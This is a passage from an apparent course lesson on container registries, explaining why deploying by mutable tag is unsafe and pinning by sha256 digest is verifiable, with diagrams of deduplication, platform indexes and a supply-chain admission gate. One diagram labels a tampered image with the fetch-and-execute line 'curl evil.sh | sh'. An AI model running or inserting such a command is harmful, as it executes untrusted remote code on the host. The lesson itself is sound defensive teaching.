# Registries, Digests & the Software Supply Chain

> `app:1.0` is not a version. It is a pointer, stored in someone else's database, that anybody with push access can move without telling you. Measured here: two pulls of the *identical* reference string returned two different manifests — `sha256:f29d198c…` and `sha256:2e3da6b0…` — while the same two pulls pinned by digest returned byte-identical content both times. The same sha256 that lets a registry store ten releases in 99.6 MiB instead of 839.3 MiB is what makes that tampering detectable at all. This lesson is about storing, distributing and *trusting* the artifact you built.

**Type:** Build
**Languages:** Python
**Prerequisites:** [Images, Layers & the Reproducible Build](../03-images-layers-and-builds/), [Cryptographic Building Blocks](../../07-auth-and-security/02-cryptographic-building-blocks/)
**Time:** ~70 minutes

## The Problem

Three nodes in the same fleet. The same Deployment. The same one line:

```yaml
image: registry.internal/app:1.0
```

Node A was scheduled on Tuesday morning. Node B came up on Wednesday afternoon when the autoscaler added capacity. Node C rebooted at 02:03 on Thursday after a kernel patch and pulled a fresh copy because its disk cache was gone.

They are running three different builds.

Nothing in your system reports this. `kubectl get pods` shows three healthy pods. The Deployment says `app:1.0`. The container's `APP_VERSION` environment variable says `1.0`, because it was baked in from the same tag. Your dashboards aggregate all three. Your logs are labelled with the version, and the label is a lie on two of the three nodes, in a way no query can reveal, because **the thing that changed is not recorded anywhere you are looking.**

Then a bug report arrives that reproduces on one node in six. You roll back to `app:0.9`, which is a tag, which was itself re-pushed six weeks ago during a hotfix that never got its own version number. The rollback "works" — the pods restart, the error goes away, and nobody can tell you what code is now running in production.

That is the *benign* version of this failure. Everything above happened because a tag is mutable and people are careless. Now make one substitution: instead of a careless colleague, the person pushing to that tag is not on your team.

There is a class of attack, seen repeatedly in the last several years across package ecosystems and container registries, that works like this:

- **The build system is compromised.** Not your source — your source is fine, and every review passed. The machine that turns source into an artifact substitutes a different artifact at the last step. The commit hash in your release notes is genuine. The bytes shipped are not the bytes that commit produces. Nobody diffing the repository will ever find it.
- **A dependency's maintainer account is taken over.** A package you have depended on for four years gets a new release from the account that has always released it. Your build pulls it, because your build pulls "the latest patch version", because that is what everyone recommends for security patches.
- **A registry credential leaks.** A CI token with push access ends up in a log, a fork, or an image layer. Nothing is deleted, nothing is broken, no alert fires. A tag is re-pointed. The next node that reboots pulls new bytes under the old name.

The third one is the cheapest and it is the one this lesson can demonstrate end to end, because it requires no exploit at all. It is a database write. A tag is a mutable pointer, and the entity that controls it is the registry — not you.

The fix is not a better process. It is to stop deploying pointers.

## The Concept

### A tag is a pointer; a digest is the content

This is the spine of the lesson, and everything else hangs off it.

A **tag** — `1.0`, `latest`, `stable`, `prod` — is a human-friendly name. It lives in a mutable key-value table on the registry side: `(repository, tag) -> manifest digest`. Re-pointing it is one write. It produces no new identifier, no version bump, no audit trail that a client can see.

A **digest** — `sha256:f29d198cc323dcab…` — is a **content address**. It is the SHA-256 hash of the exact bytes of the thing it names. You do not ask the registry *which* manifest to give you; you ask for *that* one, and you can check the answer yourself.

The difference is where trust lives:

- **Pulling by tag is trust-on-every-pull.** Every time any node fetches `app:1.0`, it asks the registry "what does this name mean right now?" and accepts the answer. You are trusting the registry, its access control, and every credential that has ever had push rights — continuously, forever, on every reboot and every autoscale event.
- **Pulling by digest is trust-once.** You decide, one time, that `sha256:f29d198c…` is the artifact you want. From then on the reference verifies itself: recompute the hash of what arrived, compare it to the name you asked for. A registry that wanted to lie to you would have to find a second input to SHA-256 with the same output.

```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 880 470" width="100%" style="max-width:840px" role="img" aria-label="Two panels comparing a pull by tag with a pull by digest. On the left, the reference registry.internal/app colon 1.0 is a mutable pointer: on Tuesday it resolves to a clean manifest sha256 f29d198c, then a single push re-points the same tag to a backdoored manifest sha256 2e3da6b0, so Thursday's pull of the identical reference string returns different bytes. On the right, the reference registry.internal/app at sha256 f29d198c is a content address, so both Tuesday's and Thursday's pulls return the byte-identical manifest and the backdoored manifest is simply unreachable from that reference.">
  <defs>
    <marker id="l04-a1" markerWidth="10" markerHeight="10" refX="6" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 Z" fill="currentColor"/></marker>
    <marker id="l04-a1r" markerWidth="10" markerHeight="10" refX="6" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 Z" fill="#d64545"/></marker>
    <marker id="l04-a1g" markerWidth="10" markerHeight="10" refX="6" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 Z" fill="#0fa07f"/></marker>
  </defs>
  <text x="440" y="26" text-anchor="middle" font-family="'JetBrains Mono', ui-monospace, monospace" font-size="14.5" font-weight="700" fill="currentColor">A tag is a pointer someone else can move. A digest is the content.</text>
  <g font-family="'JetBrains Mono', ui-monospace, monospace">
    <g fill="none" stroke-width="2" stroke-linejoin="round">
      <rect x="16" y="44" width="414" height="356" rx="14" fill="#d64545" fill-opacity="0.07" stroke="#d64545"/>
      <rect x="450" y="44" width="414" height="356" rx="14" fill="#0fa07f" fill-opacity="0.08" stroke="#0fa07f"/>
      <rect x="46" y="100" width="354" height="44" rx="9" fill="#3553ff" fill-opacity="0.13" stroke="#3553ff"/>
      <rect x="480" y="100" width="354" height="44" rx="9" fill="#3553ff" fill-opacity="0.13" stroke="#3553ff"/>
      <rect x="40" y="252" width="178" height="98" rx="10" fill="#7c5cff" fill-opacity="0.14" stroke="#7c5cff"/>
      <rect x="228" y="252" width="178" height="98" rx="10" fill="#d64545" fill-opacity="0.13" stroke="#d64545"/>
      <rect x="474" y="252" width="178" height="98" rx="10" fill="#7c5cff" fill-opacity="0.14" stroke="#7c5cff"/>
      <rect x="662" y="252" width="178" height="98" rx="10" fill="#7f7f7f" fill-opacity="0.07" stroke="currentColor" stroke-opacity="0.35" stroke-dasharray="6 5"/>
    </g>

    <g text-anchor="middle" fill="currentColor">
      <text x="223" y="70" font-size="12.5" font-weight="700" fill="#d64545">PULL BY TAG</text>
      <text x="223" y="86" font-size="9" opacity="0.85">trust the registry on EVERY pull</text>
      <text x="657" y="70" font-size="12.5" font-weight="700" fill="#0fa07f">PULL BY DIGEST</text>
      <text x="657" y="86" font-size="9" opacity="0.85">trust ONCE, at the moment you pin</text>
      <text x="223" y="122" font-size="11.5" font-weight="700">registry.internal/app:1.0</text>
      <text x="223" y="137" font-size="8.5" opacity="0.85">a mutable pointer — the registry decides what it means</text>
      <text x="657" y="122" font-size="10.5" font-weight="700">registry.internal/app@sha256:f29d198cc323...</text>
      <text x="657" y="137" font-size="8.5" opacity="0.85">a content address — the name IS the bytes</text>
    </g>

    <g fill="none" stroke-width="1.9">
      <path d="M150 148 C 132 190, 120 220, 118 246" stroke="currentColor" stroke-opacity="0.55" stroke-dasharray="5 4" marker-end="url(#l04-a1)"/>
      <path d="M300 148 C 314 190, 326 220, 328 246" stroke="#d64545" marker-end="url(#l04-a1r)"/>
      <path d="M563 148 L 563 246" stroke="#0fa07f" marker-end="url(#l04-a1g)"/>
    </g>

    <g fill="currentColor">
      <text x="60" y="182" font-size="9.5" font-weight="700">Tue 09:14</text>
      <text x="60" y="196" font-size="8.5" opacity="0.8">-&gt; f29d198c</text>
      <text x="340" y="182" font-size="9.5" font-weight="700" fill="#d64545">Thu 02:03</text>
      <text x="340" y="196" font-size="8.5" opacity="0.8">-&gt; 2e3da6b0</text>
      <text x="223" y="212" font-size="9.5" font-weight="700" text-anchor="middle" fill="#d64545">one push re-points the tag</text>
      <text x="223" y="228" font-size="8.5" text-anchor="middle" opacity="0.9">no new digest, no audit trail</text>
      <text x="580" y="182" font-size="9.5" font-weight="700" fill="#0fa07f">Tue 09:14  -&gt; f29d198c</text>
      <text x="580" y="196" font-size="9.5" font-weight="700" fill="#0fa07f">Thu 02:03  -&gt; f29d198c</text>
      <text x="580" y="214" font-size="8.5" opacity="0.9">the retag happened here too.</text>
      <text x="580" y="228" font-size="8.5" opacity="0.9">This reference never asks.</text>
    </g>

    <g fill="currentColor" text-anchor="middle">
      <text x="129" y="276" font-size="10" font-weight="700">manifest</text>
      <text x="129" y="293" font-size="9.5">sha256:f29d198c</text>
      <text x="129" y="313" font-size="8.5" opacity="0.75">app-code layer</text>
      <text x="129" y="328" font-size="9">build 8f21c4 (clean)</text>
      <text x="317" y="276" font-size="10" font-weight="700">manifest</text>
      <text x="317" y="293" font-size="9.5">sha256:2e3da6b0</text>
      <text x="317" y="313" font-size="8.5" opacity="0.75">app-code layer</text>
      <text x="317" y="328" font-size="8.5" font-weight="700" fill="#d64545">+ curl evil.sh | sh</text>
      <text x="563" y="276" font-size="10" font-weight="700">manifest</text>
      <text x="563" y="293" font-size="9.5">sha256:f29d198c</text>
      <text x="563" y="313" font-size="8.5" opacity="0.75">app-code layer</text>
      <text x="563" y="328" font-size="9">build 8f21c4 (clean)</text>
      <text x="751" y="276" font-size="10" font-weight="700" opacity="0.6">manifest</text>
      <text x="751" y="293" font-size="9.5" opacity="0.6">sha256:2e3da6b0</text>
      <text x="751" y="316" font-size="8.5" opacity="0.7">it exists in the registry,</text>
      <text x="751" y="330" font-size="8.5" opacity="0.7">unreachable from this ref</text>
    </g>

    <g text-anchor="middle" fill="currentColor">
      <text x="223" y="374" font-size="11" font-weight="700" fill="#d64545">two pulls, two different sets of bytes</text>
      <text x="223" y="391" font-size="10">identical?&#8195;False</text>
      <text x="657" y="374" font-size="11" font-weight="700" fill="#0fa07f">two pulls, byte-identical</text>
      <text x="657" y="391" font-size="10">identical?&#8195;True</text>
    </g>
    <text x="440" y="430" font-size="11" text-anchor="middle" fill="currentColor" opacity="0.9">The pinned pull either returns those exact bytes or fails with MANIFEST_UNKNOWN.</text>
    <text x="440" y="450" font-size="11" text-anchor="middle" fill="currentColor" opacity="0.9">It never quietly resolves to something else. Deploy by digest; tags are for humans.</text>
  </g>
</svg>
```

Note the failure mode on the right, because it is the reason this is safe rather than merely different: **a pin either returns the exact bytes or it fails.** If the manifest has been garbage-collected, you get `MANIFEST_UNKNOWN` and the deploy stops. It never quietly resolves to something else. A tag has no such property; its failure mode is *success with the wrong content*, which is the worst failure mode a system can have.

### How a registry actually works

A container registry is a much smaller thing than its reputation suggests. The **OCI Distribution Specification** (OCI = Open Container Initiative, the standards body that took over Docker's image and registry formats) defines it as an HTTP API over exactly two kinds of object:

- **Blobs** — opaque byte strings, addressed by their digest. Layers are blobs. The image config is a blob. Everything large is a blob.
- **Manifests** — small JSON documents that *describe* an image: which config blob, which layer blobs, in what order, with what sizes and media types. A manifest is itself stored and addressed by its own digest.

Both live in **content-addressable storage** (CAS): the storage key *is* `sha256(value)`. That single design choice buys three things at once, and they are usually taught as three separate topics:

1. **Integrity.** You can verify what you received without trusting who sent it.
2. **Deduplication.** Two images built on the same base store that base once, because identical bytes produce an identical key. This is not an optimisation the registry performs; it is a consequence of the addressing scheme.
3. **Caching that is always correct.** A content address can never go stale, so any layer you have already downloaded is valid forever. (The same reasoning underlies a strong `ETag`; see [HTTP Caching & ETags](../../05-caching/08-http-caching-and-etags/).)

A pull is four steps, and every one of them after the first is verifiable:

```text
1. resolve   GET /v2/<name>/manifests/<tag>      -> a manifest digest      (TRUST)
2. manifest  GET /v2/<name>/manifests/<digest>   -> JSON; check sha256     (VERIFY)
3. config    GET /v2/<name>/blobs/<digest>       -> JSON; check sha256     (VERIFY)
4. layers    GET /v2/<name>/blobs/<digest>  x N  -> bytes; check sha256    (VERIFY)
```

Step 1 is the only step that involves trust, and pinning by digest deletes it. Everything from step 2 down is arithmetic.

```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 880 480" width="100%" style="max-width:840px" role="img" aria-label="Two images, app 1.0 and app 1.1, drawn as stacks of four layers each, next to a blob store keyed by the sha256 of each layer's content. The base OS layer at 29.3 mebibytes and the Python runtime layer at 41.7 mebibytes are byte-identical in both images, so both stacks point at the same single stored blob; the dependency and application code layers differ and are stored once each. Two images have 167.4 mebibytes of logical size but occupy 96.5 mebibytes on disk, a saving of 71.0 mebibytes or 42 percent. Across ten releases the same store holds 839.3 mebibytes of logical image data in 99.6 mebibytes, an 88.1 percent saving.">
  <defs>
    <marker id="l04-a2" markerWidth="9" markerHeight="9" refX="6" refY="3" orient="auto"><path d="M0,0 L6.5,3 L0,6 Z" fill="#0fa07f"/></marker>
  </defs>
  <text x="440" y="26" text-anchor="middle" font-family="'JetBrains Mono', ui-monospace, monospace" font-size="14.5" font-weight="700" fill="currentColor">A registry is a key-value store keyed by the hash of the value</text>
  <g font-family="'JetBrains Mono', ui-monospace, monospace">
    <g fill="currentColor" font-size="9" font-weight="700" opacity="0.6">
      <text x="34" y="70">IMAGES (what you push)</text>
      <text x="500" y="70">BLOB STORE (what is kept)</text>
      <text x="866" y="70" text-anchor="end">MiB</text>
    </g>
    <text x="99" y="88" font-family="'JetBrains Mono', ui-monospace, monospace" font-size="10.5" font-weight="700" text-anchor="middle" fill="#7c5cff">app:1.0</text>
    <text x="257" y="88" font-family="'JetBrains Mono', ui-monospace, monospace" font-size="10.5" font-weight="700" text-anchor="middle" fill="#7c5cff">app:1.1</text>

    <g fill="none" stroke-width="1.7" stroke-linejoin="round">
      <rect x="34" y="96" width="130" height="30" rx="6" fill="#0fa07f" fill-opacity="0.14" stroke="#0fa07f"/>
      <rect x="34" y="132" width="130" height="30" rx="6" fill="#0fa07f" fill-opacity="0.14" stroke="#0fa07f"/>
      <rect x="34" y="168" width="130" height="30" rx="6" fill="#e0930f" fill-opacity="0.14" stroke="#e0930f"/>
      <rect x="34" y="204" width="130" height="30" rx="6" fill="#e0930f" fill-opacity="0.14" stroke="#e0930f"/>
      <rect x="192" y="96" width="130" height="30" rx="6" fill="#0fa07f" fill-opacity="0.14" stroke="#0fa07f"/>
      <rect x="192" y="132" width="130" height="30" rx="6" fill="#0fa07f" fill-opacity="0.14" stroke="#0fa07f"/>
      <rect x="192" y="168" width="130" height="30" rx="6" fill="#e0930f" fill-opacity="0.14" stroke="#e0930f"/>
      <rect x="192" y="204" width="130" height="30" rx="6" fill="#e0930f" fill-opacity="0.14" stroke="#e0930f"/>
    </g>
    <g fill="currentColor" font-size="8.5">
      <text x="42" y="110">base-os</text><text x="156" y="110" text-anchor="end" font-weight="700">29.3</text>
      <text x="42" y="121" opacity="0.65">debian-bookworm</text>
      <text x="42" y="146">python</text><text x="156" y="146" text-anchor="end" font-weight="700">41.7</text>
      <text x="42" y="157" opacity="0.65">3.12.4 runtime</text>
      <text x="42" y="182">deps</text><text x="156" y="182" text-anchor="end" font-weight="700">12.1</text>
      <text x="42" y="193" opacity="0.65">site-pkgs 2024-03</text>
      <text x="42" y="218">app-code</text><text x="156" y="218" text-anchor="end" font-weight="700">0.4</text>
      <text x="42" y="229" opacity="0.65">build 8f21c4</text>
      <text x="200" y="110">base-os</text><text x="314" y="110" text-anchor="end" font-weight="700">29.3</text>
      <text x="200" y="121" opacity="0.65">debian-bookworm</text>
      <text x="200" y="146">python</text><text x="314" y="146" text-anchor="end" font-weight="700">41.7</text>
      <text x="200" y="157" opacity="0.65">3.12.4 runtime</text>
      <text x="200" y="182">deps</text><text x="314" y="182" text-anchor="end" font-weight="700">12.6</text>
      <text x="200" y="193" opacity="0.65">site-pkgs 2024-07</text>
      <text x="200" y="218">app-code</text><text x="314" y="218" text-anchor="end" font-weight="700">0.4</text>
      <text x="200" y="229" opacity="0.65">build a37e90</text>
    </g>
    <text x="99" y="252" font-family="'JetBrains Mono', ui-monospace, monospace" font-size="9" text-anchor="middle" fill="currentColor" opacity="0.85">83.5 MiB logical</text>
    <text x="257" y="252" font-family="'JetBrains Mono', ui-monospace, monospace" font-size="9" text-anchor="middle" fill="currentColor" opacity="0.85">84.0 MiB logical</text>

    <g fill="none" stroke="#0fa07f" stroke-width="1.5" opacity="0.9">
      <path d="M164 111 L 186 111" marker-end="url(#l04-a2)"/>
      <path d="M164 147 L 186 147" marker-end="url(#l04-a2)"/>
      <path d="M322 111 L 494 111" marker-end="url(#l04-a2)"/>
      <path d="M322 147 L 494 147" marker-end="url(#l04-a2)"/>
    </g>
    <text x="408" y="104" font-family="'JetBrains Mono', ui-monospace, monospace" font-size="8.5" text-anchor="middle" fill="#0fa07f" font-weight="700">two references, one blob</text>
    <text x="408" y="140" font-family="'JetBrains Mono', ui-monospace, monospace" font-size="8.5" text-anchor="middle" fill="#0fa07f" font-weight="700">two references, one blob</text>
    <text x="175" y="90" font-family="'JetBrains Mono', ui-monospace, monospace" font-size="8.5" text-anchor="middle" fill="#0fa07f" font-weight="700">identical</text>

    <g fill="none" stroke-width="1.7" stroke-linejoin="round">
      <rect x="500" y="96" width="366" height="30" rx="6" fill="#0fa07f" fill-opacity="0.14" stroke="#0fa07f"/>
      <rect x="500" y="132" width="366" height="30" rx="6" fill="#0fa07f" fill-opacity="0.14" stroke="#0fa07f"/>
      <rect x="500" y="168" width="366" height="30" rx="6" fill="#e0930f" fill-opacity="0.14" stroke="#e0930f"/>
      <rect x="500" y="204" width="366" height="30" rx="6" fill="#e0930f" fill-opacity="0.14" stroke="#e0930f"/>
      <rect x="500" y="240" width="366" height="30" rx="6" fill="#e0930f" fill-opacity="0.14" stroke="#e0930f"/>
      <rect x="500" y="276" width="366" height="30" rx="6" fill="#e0930f" fill-opacity="0.14" stroke="#e0930f"/>
    </g>
    <g fill="currentColor" font-size="9">
      <text x="510" y="115">sha256:293735e05401</text><text x="696" y="115" opacity="0.8" font-size="8.5">base-os</text><text x="800" y="115" font-size="8.5" font-weight="700" fill="#0fa07f">refs 2</text><text x="858" y="115" text-anchor="end" font-weight="700">29.3</text>
      <text x="510" y="151">sha256:9f382db21fa8</text><text x="696" y="151" opacity="0.8" font-size="8.5">python</text><text x="800" y="151" font-size="8.5" font-weight="700" fill="#0fa07f">refs 2</text><text x="858" y="151" text-anchor="end" font-weight="700">41.7</text>
      <text x="510" y="187">sha256:01a40d1a80af</text><text x="696" y="187" opacity="0.8" font-size="8.5">deps 2024-03</text><text x="800" y="187" font-size="8.5" opacity="0.75">refs 1</text><text x="858" y="187" text-anchor="end" font-weight="700">12.1</text>
      <text x="510" y="223">sha256:a102a04c2c69</text><text x="696" y="223" opacity="0.8" font-size="8.5">deps 2024-07</text><text x="800" y="223" font-size="8.5" opacity="0.75">refs 1</text><text x="858" y="223" text-anchor="end" font-weight="700">12.6</text>
      <text x="510" y="259">sha256:5a1998589b8a</text><text x="696" y="259" opacity="0.8" font-size="8.5">app-code 1.0</text><text x="800" y="259" font-size="8.5" opacity="0.75">refs 1</text><text x="858" y="259" text-anchor="end" font-weight="700">0.4</text>
      <text x="510" y="295">sha256:f0bafd2e78ee</text><text x="696" y="295" opacity="0.8" font-size="8.5">app-code 1.1</text><text x="800" y="295" font-size="8.5" opacity="0.75">refs 1</text><text x="858" y="295" text-anchor="end" font-weight="700">0.4</text>
    </g>

    <g fill="none" stroke-width="1.9" stroke-linejoin="round">
      <rect x="34" y="330" width="380" height="112" rx="11" fill="#7f7f7f" fill-opacity="0.08" stroke="currentColor" stroke-opacity="0.45"/>
      <rect x="466" y="330" width="380" height="112" rx="11" fill="#0fa07f" fill-opacity="0.10" stroke="#0fa07f"/>
    </g>
    <g fill="currentColor">
      <text x="50" y="352" font-size="10.5" font-weight="700">TWO IMAGES (1.0 + 1.1)</text>
      <text x="50" y="374" font-size="9.5" opacity="0.9">logical bytes</text><text x="398" y="374" font-size="9.5" text-anchor="end" font-weight="700">167.4 MiB</text>
      <text x="50" y="392" font-size="9.5" opacity="0.9">bytes on disk</text><text x="398" y="392" font-size="9.5" text-anchor="end" font-weight="700">96.5 MiB</text>
      <text x="50" y="410" font-size="9.5" opacity="0.9">saved</text><text x="398" y="410" font-size="9.5" text-anchor="end" font-weight="700" fill="#0fa07f">71.0 MiB  (42%)</text>
      <text x="50" y="430" font-size="8.5" opacity="0.8">pushing 1.1 uploaded 13.0 MiB of an 84.0 MiB image</text>
      <text x="482" y="352" font-size="10.5" font-weight="700" fill="#0fa07f">TEN RELEASES (1.0 through 1.9)</text>
      <text x="482" y="374" font-size="9.5" opacity="0.9">logical bytes</text><text x="830" y="374" font-size="9.5" text-anchor="end" font-weight="700">839.3 MiB</text>
      <text x="482" y="392" font-size="9.5" opacity="0.9">bytes on disk</text><text x="830" y="392" font-size="9.5" text-anchor="end" font-weight="700">99.6 MiB</text>
      <text x="482" y="410" font-size="9.5" opacity="0.9">saved</text><text x="830" y="410" font-size="9.5" text-anchor="end" font-weight="700" fill="#0fa07f">739.6 MiB  (88.1%)</text>
      <text x="482" y="430" font-size="8.5" opacity="0.8">60 blob puts, 26 of them already present</text>
    </g>
    <text x="440" y="466" font-size="11" text-anchor="middle" fill="currentColor" opacity="0.9">The same property that makes storage cheap makes tampering detectable: the key is the hash of the value.</text>
  </g>
</svg>
```

The measured saving is the point. Two images that share a base OS and an interpreter have **167.4 MiB of logical content stored in 96.5 MiB — a 42% saving with no compression involved.** Across ten releases of the same application, where only the small application layer changes, the store holds **839.3 MiB of logical images in 99.6 MiB, an 88.1% saving**, and pushing a new release uploaded 13.0 MiB of an 84.0 MiB image. This is also why your CI feels fast: the base layers were already there.

### One tag, many platforms

A tag does not have to point at an image. It can point at an **image index** (the OCI name; Docker calls the same thing a *manifest list*): a small JSON document listing one manifest per platform, each tagged with an `os` and an `architecture`.

When you pull, your client picks the entry matching the machine it is running on. That means **`latest` on your Apple Silicon laptop and `latest` on your x86 cluster are legitimately different bytes, with nothing wrong and nobody at fault.** In the Build It the same tag resolves to `sha256:021ff5d9dff0` for `linux/amd64` and `sha256:6903a610c98a` for `linux/arm64`, under one index digest `sha256:f0f8e9b7712b`.

Two consequences worth writing down. First, **"it works on my machine" has a new and entirely legitimate form** — you and the cluster genuinely ran different binaries. Second, **pin the index digest, not the platform digest.** Pinning `sha256:021ff5d9dff0` pins you to amd64 forever, which works right up until someone adds an arm64 node pool.

### The trust chain: source → build → artifact → deployment

Pinning by digest answers "did I get the bytes I asked for?" It does not answer "should I have asked for those bytes?" Nothing about a digest says who produced it or from what. For that you need a chain, and every hop in it needs an answer to the same question: **who made this, and from what?**

```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 880 512" width="100%" style="max-width:840px" role="img" aria-label="The software supply chain drawn as six hops: source, build, sign and attest, registry, admission, and running pod. Under each hop is the check performed there and, in red, what an attacker gets if that check is missing: a taken-over maintainer account at source, a build host substituting a different artifact at build, no way to identify the artifact if it is unsigned, a re-pointed tag at the registry, and a cluster running whatever the tag resolves to today if admission does not verify. At the bottom, the measured admission gate result: of six candidate images only one is admitted, the other five denied for not being pinned by digest, being unsigned, being signed with a rotated key, or having provenance from an untrusted source and builder.">
  <defs>
    <marker id="l04-a3" markerWidth="10" markerHeight="10" refX="6" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 Z" fill="currentColor"/></marker>
  </defs>
  <text x="440" y="26" text-anchor="middle" font-family="'JetBrains Mono', ui-monospace, monospace" font-size="14.5" font-weight="700" fill="currentColor">Source to pod: every hop needs an answer to "who made this, and from what?"</text>
  <g font-family="'JetBrains Mono', ui-monospace, monospace">
    <g fill="none" stroke-width="2" stroke-linejoin="round">
      <rect x="15" y="52" width="130" height="76" rx="10" fill="#3553ff" fill-opacity="0.12" stroke="#3553ff"/>
      <rect x="159" y="52" width="130" height="76" rx="10" fill="#3553ff" fill-opacity="0.12" stroke="#3553ff"/>
      <rect x="303" y="52" width="130" height="76" rx="10" fill="#7c5cff" fill-opacity="0.14" stroke="#7c5cff"/>
      <rect x="447" y="52" width="130" height="76" rx="10" fill="#7c5cff" fill-opacity="0.14" stroke="#7c5cff"/>
      <rect x="591" y="52" width="130" height="76" rx="10" fill="#0fa07f" fill-opacity="0.14" stroke="#0fa07f"/>
      <rect x="735" y="52" width="130" height="76" rx="10" fill="#0fa07f" fill-opacity="0.14" stroke="#0fa07f"/>
    </g>
    <g fill="none" stroke="currentColor" stroke-width="1.6" opacity="0.65">
      <path d="M145 90 L 153 90" marker-end="url(#l04-a3)"/>
      <path d="M289 90 L 297 90" marker-end="url(#l04-a3)"/>
      <path d="M433 90 L 441 90" marker-end="url(#l04-a3)"/>
      <path d="M577 90 L 585 90" marker-end="url(#l04-a3)"/>
      <path d="M721 90 L 729 90" marker-end="url(#l04-a3)"/>
    </g>
    <g fill="currentColor" text-anchor="middle">
      <text x="80" y="78" font-size="10.5" font-weight="700" fill="#3553ff">SOURCE</text>
      <text x="80" y="96" font-size="8.5" opacity="0.9">a git commit</text>
      <text x="80" y="112" font-size="8.5" opacity="0.75">what a human wrote</text>
      <text x="224" y="78" font-size="10.5" font-weight="700" fill="#3553ff">BUILD</text>
      <text x="224" y="96" font-size="8.5" opacity="0.9">CI turns it into</text>
      <text x="224" y="112" font-size="8.5" opacity="0.75">layers + a manifest</text>
      <text x="368" y="78" font-size="10.5" font-weight="700" fill="#7c5cff">SIGN + ATTEST</text>
      <text x="368" y="96" font-size="8.5" opacity="0.9">signature, SBOM,</text>
      <text x="368" y="112" font-size="8.5" opacity="0.75">provenance</text>
      <text x="512" y="78" font-size="10.5" font-weight="700" fill="#7c5cff">REGISTRY</text>
      <text x="512" y="96" font-size="8.5" opacity="0.9">blobs by digest,</text>
      <text x="512" y="112" font-size="8.5" opacity="0.75">tags by convention</text>
      <text x="656" y="78" font-size="10.5" font-weight="700" fill="#0fa07f">ADMISSION</text>
      <text x="656" y="96" font-size="8.5" opacity="0.9">the gate, at deploy</text>
      <text x="656" y="112" font-size="8.5" opacity="0.75">time, in the cluster</text>
      <text x="800" y="78" font-size="10.5" font-weight="700" fill="#0fa07f">RUNNING POD</text>
      <text x="800" y="96" font-size="8.5" opacity="0.9">known bytes,</text>
      <text x="800" y="112" font-size="8.5" opacity="0.75">named by digest</text>
    </g>

    <text x="15" y="152" font-family="'JetBrains Mono', ui-monospace, monospace" font-size="9" font-weight="700" fill="currentColor" opacity="0.6">THE CHECK PERFORMED HERE</text>
    <path d="M15 158 L 865 158" fill="none" stroke="currentColor" stroke-width="1" opacity="0.3"/>
    <g fill="currentColor" font-size="8.5" text-anchor="middle" opacity="0.92">
      <text x="80" y="176">branch protection</text><text x="80" y="189">two reviewers</text><text x="80" y="202">signed commits</text>
      <text x="224" y="176">hermetic build</text><text x="224" y="189">base pinned by digest</text><text x="224" y="202">isolated runner</text>
      <text x="368" y="176">sign the DIGEST</text><text x="368" y="189">emit an SBOM</text><text x="368" y="202">record who built it</text>
      <text x="512" y="176">immutable tags on</text><text x="512" y="189">sha256 checked on</text><text x="512" y="202">every blob read</text>
      <text x="656" y="176">pinned by digest?</text><text x="656" y="189">signature trusted?</text><text x="656" y="202">source allowed?</text>
      <text x="800" y="176">image@sha256 in</text><text x="800" y="189">the pod spec equals</text><text x="800" y="202">what was verified</text>
    </g>

    <text x="15" y="234" font-family="'JetBrains Mono', ui-monospace, monospace" font-size="9" font-weight="700" fill="#d64545" opacity="0.85">WHAT AN ATTACKER GETS IF IT IS MISSING</text>
    <path d="M15 240 L 865 240" fill="none" stroke="#d64545" stroke-width="1" opacity="0.35"/>
    <g fill="#d64545" font-size="8.5" text-anchor="middle">
      <text x="80" y="258">a maintainer account</text><text x="80" y="271">is taken over and</text><text x="80" y="284">pushes a backdoor</text>
      <text x="224" y="258">the build host swaps</text><text x="224" y="271">a different artifact</text><text x="224" y="284">in for the real one</text>
      <text x="368" y="258">nothing downstream</text><text x="368" y="271">can say what this</text><text x="368" y="284">artifact even is</text>
      <text x="512" y="258">a tag is re-pointed:</text><text x="512" y="271">same reference,</text><text x="512" y="284">different bytes</text>
      <text x="656" y="258">the cluster runs</text><text x="656" y="271">whatever the tag</text><text x="656" y="284">resolves to today</text>
      <text x="800" y="258">you cannot answer</text><text x="800" y="271">"what is running?"</text><text x="800" y="284">during an incident</text>
    </g>

    <rect x="15" y="308" width="850" height="154" rx="11" fill="#0fa07f" fill-opacity="0.08" stroke="#0fa07f" stroke-width="1.9"/>
    <g fill="currentColor">
      <text x="30" y="330" font-size="10.5" font-weight="700">MEASURED AT THE GATE — 6 candidate images, 1 admitted</text>
      <text x="30" y="348" font-size="8.5" opacity="0.7">DECISION</text><text x="106" y="348" font-size="8.5" opacity="0.7">REFERENCE</text><text x="392" y="348" font-size="8.5" opacity="0.7">REASON</text>
    </g>
    <g font-size="9">
      <text x="30" y="366" fill="#d64545" font-weight="700">DENY</text><text x="106" y="366" fill="currentColor">app:latest</text><text x="392" y="366" fill="currentColor" opacity="0.9">not pinned; no signature; no provenance</text>
      <text x="30" y="382" fill="#d64545" font-weight="700">DENY</text><text x="106" y="382" fill="currentColor">app:1.1</text><text x="392" y="382" fill="currentColor" opacity="0.9">not pinned by digest — and it is the good image</text>
      <text x="30" y="398" fill="#0fa07f" font-weight="700">ALLOW</text><text x="106" y="398" fill="currentColor">app@sha256:f0f8e9b7712b</text><text x="392" y="398" fill="#0fa07f" opacity="0.95">pinned + trusted key + allowed source repo</text>
      <text x="30" y="414" fill="#d64545" font-weight="700">DENY</text><text x="106" y="414" fill="currentColor">app@sha256:2e3da6b042ac</text><text x="392" y="414" fill="currentColor" opacity="0.9">no signature — this is the backdoored build</text>
      <text x="30" y="430" fill="#d64545" font-weight="700">DENY</text><text x="106" y="430" fill="currentColor">app@sha256:021ff5d9dff0</text><text x="392" y="430" fill="currentColor" opacity="0.9">signed with a key rotated out of the policy</text>
      <text x="30" y="446" fill="#d64545" font-weight="700">DENY</text><text x="106" y="446" fill="currentColor">scraper@sha256:411713da89</text><text x="392" y="446" fill="currentColor" opacity="0.9">built from a fork, on a laptop</text>
    </g>
    <text x="440" y="492" font-size="11" text-anchor="middle" fill="currentColor" opacity="0.9">A pin without a signature proves only that nobody changed it since you looked. A signature without a pin secures a pointer.</text>
  </g>
</svg>
```

Four pieces of machinery fill in that chain. Keep them distinct; they are routinely conflated.

